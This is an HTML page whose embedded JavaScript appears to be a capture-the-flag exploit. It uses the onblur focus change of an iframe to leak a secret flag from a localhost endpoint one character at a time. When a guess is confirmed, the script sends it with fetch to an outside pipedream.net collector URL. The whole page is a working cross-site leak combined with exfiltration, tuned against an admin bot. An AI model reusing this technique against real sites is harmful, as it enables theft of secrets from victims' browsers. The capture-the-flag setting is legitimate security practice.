<html>
    <body>
        <script> 
            (async () => {
                
                const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_ ";

                const leak = async (url) => {
                    return new Promise(r => {
                        let iframe = document.createElement('iframe')

                        // we lost focus so id matches
                        window.onblur = async () => {
                            console.debug('onblur fired')
                            console.log(`find flag!!!${curr}`)
                            window.onblur = ''
                            // we need to wait so chrome dosnt crash when removing the iframe
                            await sleep(30)
                            iframe.remove()
                            return r(1)
                        }

                        // no match
                        setTimeout(() => {
                            window.onblur = ''
                            iframe.remove()
                            return r(0)
                        }, 300) // calibrate timeout based on server's admin bot

                        iframe.src = `${url}#Zombie`

                        document.body.appendChild(iframe)
                    })
                }

                const sleep = (ms) => {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                // Repeat this for each letter to get the flag
                let curr = 'hspace{fake'

                for (let i = 0; i < ALPHABET.length; i++) {
                    let temp = curr + ALPHABET[i]
                    console.log(`Trying: ${temp}`)

                    if (await leak(`http://localhost/flag?flag=${temp}`)) {                        
                        fetch("https://eolaq55qd52ucye.m.pipedream.net/?flag=" + temp)
                        break
                    }
                }
            })()
        </script>
    </body>
</html>
